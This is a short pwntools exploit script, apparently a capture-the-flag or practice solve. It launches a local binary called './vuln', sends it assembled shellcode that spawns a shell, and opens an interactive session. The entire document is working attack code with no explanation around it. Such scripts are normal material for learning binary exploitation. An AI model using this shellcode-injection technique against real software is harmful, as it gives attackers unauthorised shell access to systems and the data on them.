from pwn import*

sh = process('./vuln')

sh.sendlineafter('!\n', asm(shellcraft.common.sh()))

sh.interactive()